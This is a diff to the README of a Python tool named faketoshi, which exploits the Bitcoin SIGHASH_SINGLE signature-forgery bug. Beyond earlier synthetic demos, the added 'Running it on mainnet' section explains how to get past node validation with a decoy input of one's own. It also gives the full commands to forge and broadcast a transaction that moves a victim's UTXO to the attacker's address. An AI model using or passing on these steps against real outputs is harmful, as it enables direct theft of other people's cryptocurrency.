@@ -41,7 +41,8 @@ python -m faketoshi decode <txhex>
 # The SIGHASH_SINGLE signature-forgery bug
 python -m faketoshi sighash-single-demo      # synthetic: replay a signature
 python -m faketoshi replay-history           # the real BitPay/Copay theft
-python -m faketoshi forge-replay --txid <txid> --value <sats> --to <addr>
+python -m faketoshi forge-replay --txid <txid> --value <sats> --to <addr> \
+    [--decoy-txid <own utxo> --decoy-value <sats> --decoy-key <hex>]  # broadcastable
 
 # Optionally install the `faketoshi` command
 pip install -e .
@@ -390,6 +391,34 @@ The target input must sit at an index with **no matching output** — that is th
 entire precondition. `--from-tx` harvests from a transaction you supply instead
 of the built-in one; signatures that were signed `SIGHASH_ALL` produce nothing,
 because they commit to a real digest.
+
+#### Running it on mainnet
+
+`forge-replay` already defaults to `--network mainnet`, and the harvested
+signatures work against a real mainnet outpoint — the digest is the constant, so
+it does not depend on which coin you point it at.
+
+What stops a *broadcast* is the decoy input. A node validates every input
+against the UTXO set, so a synthetic outpoint is rejected with
+`bad-txns-inputs-missingorspent` before anyone looks at the harvested signature.
+Supply a real UTXO of your own as input 0, and sign it:
+
+```
+$ python -m faketoshi forge-replay \
+      --txid <victim utxo txid> --vout 0 --value 677200 \
+      --to <your address> \
+      --decoy-txid <your utxo txid> --decoy-vout 1 --decoy-value 50000 \
+      --decoy-key <your private key for it>
+...
+Input 0 spends your decoy UTXO, so every input is real and this
+transaction is broadcastable:
+  python -m faketoshi broadcast --network mainnet <hex above>
+```
+
+Without the decoy flags it prints a warning saying so, rather than handing you a
+transaction that will bounce. The decoy is spent with `SIGHASH_ALL`, so you are
+spending your own coin normally (its value adds to the output); the victim input
+is the one spent without a signature.
 
 Verification of the built-in transaction, for what it is worth: its txid hashes
 to the value above, its single output pays `1Lyafe8m…`, the redeem script's
